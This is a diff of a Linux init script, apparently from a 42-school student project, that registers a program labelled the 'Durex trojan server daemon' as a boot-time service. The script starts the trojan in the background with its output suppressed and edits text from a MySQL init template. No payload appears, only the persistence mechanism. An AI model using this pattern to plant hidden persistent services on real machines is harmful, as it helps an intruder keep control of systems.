@@ -1,35 +1,28 @@
 #!/bin/bash
 #
 ### BEGIN INIT INFO
-# Provides:          durex
-# Required-Start:    $remote_fs $syslog
-# Required-Stop:     $remote_fs $syslog
-# Should-Start:      $network $time
-# Should-Stop:       $network $time
+# Provides:          Durex
+# Required-Start:    $syslog $time $remote_fs
+# Required-Stop:     $syslog $time $remote_fs
 # Default-Start:     2 3 4 5
 # Default-Stop:      0 1 6
-# Short-Description: Start and stop the mysql database server daemon
-# Description:       Controls the main MySQL database server daemon "mysqld"
-#                    and its wrapper script "mysqld_safe".
+# Short-Description: Start and stop the Durex trojan server daemon
+# Description:       Durex trojan
 ### END INIT INFO
 #
-set -e
-set -u
-${DEBIAN_SCRIPT_DEBUG:+ set -v -x};
+# Author:            Jeremy Guyet <jguyet@student.42.fr>
+#                    Denis Moureu <dmoureu-@student.42.fr>
+#
 
-. /lib/lsb/init-functions
-
-PATH="/usr/bin/:/bin/"
+PATH="/bin:/usr/bin:/sbin:/usr/sbin"
 DAEMON="/usr/bin/Durex"
 SELF=$(cd $(dirname $0); pwd -P)/$(basename $0)
-DUREX="/usr/bin/Durex"
 
-# priority can be overriden and "-s" adds output to stderr
-ERR_LOGGER="logger -p daemon.err -t /etc/init.d/Durex -i"
+# exit if DAEMON dosen't exists
+test -x $DAEMON || exit 0
 
-# Safeguard (relative paths, core dumps..)
-cd /
-umask 077
+# daemon library
+. /lib/lsb/init-functions
 
 ## Checks if there is a server running and if so if it is accessible.
 #
@@ -39,16 +32,13 @@ umask 077
 #
 # Usage: boolean durex_status [check_alive|check_dead] [warn|nowarn]
 durex_status () {
-    status_output=`$DUREX status 2>&1`
+    status_output=`$DAEMON status 2>&1`
 	ping_alive=$?
     if [ "$1" = "check_alive"  -a  $ping_alive = 1 ] ||
        [ "$1" = "check_dead"   -a  $ping_alive = 0 ]; then
-	return 0 # EXIT_SUCCESS
+			return 0 # OFFLINE
     else
-  	if [ "$2" = "warn" ]; then
-  	    echo -e "processes alive and '$DUREX status' resulted in\n" | $ERR_LOGGER -p daemon.debug
-	fi
-  	return 1 # EXIT_FAILURE
+			return 1 # ONLINE
     fi
 }
 
@@ -59,7 +49,7 @@ durex_status () {
 #case "${1:-''}" in
 case "$1" in
   'start')
-	$SELF system-reload
+	#$SELF system-reload
 	# Start daemon
 	log_daemon_msg "Starting Durex server" "durex"
 	log_end_msg 0
@@ -67,22 +57,24 @@ case "$1" in
 	   echo "Durex already running."
 	else
 	    # Start Durex!
-		start_daemon -p `$DUREX pid` $DAEMON
-		if !durex_status; then
-			$DAEMON > /dev/null 2>&1 &
+		#start_daemon -p `$DAEMON pid` $DAEMON
+		if durex_status check_alive nowarn; then
+			exit 0
+		else
+			$DAEMON " " > /dev/null 2>&1 &
 		fi
 	fi
 	;;
 
   'stop')
-	$SELF system-reload
+	#$SELF system-reload
 	log_daemon_msg "Stopping Durex server" "durex"
 	log_end_msg 0
 	if durex_status check_alive nowarn; then #service systemctl
-		killproc -p `$DUREX pid` $DAEMON
+		killproc -p `$DAEMON pid` $DAEMON
 	fi
 	if durex_status check_alive nowarn; then #service init
-		kill -15 `$DUREX pid`
+		kill -15 `$DAEMON pid`
 	fi
 	;;
 
@@ -94,17 +86,17 @@ case "$1" in
   'reload'|'force-reload')
 	$SELF system-reload
 	log_daemon_msg "Reloading Durex server" "durex"
-	$DUREX reload
+	$SELF restart
 	log_end_msg 0
 	;;
 
   'status')
 	$SELF system-reload
-	status_of_proc -p `$DUREX pid` $DAEMON Durex && exit 0 || exit $?
+	status_of_proc -p `$DAEMON pid` $DAEMON Durex && exit 0 || exit $?
   	;;
 
   'system-reload')
-	systemctl daemon-reload
+	systemctl daemon-reload > /dev/null 2>&1 &
 	;;
   *)
 	echo "Usage: $SELF start|stop|restart|reload|force-reload|status"
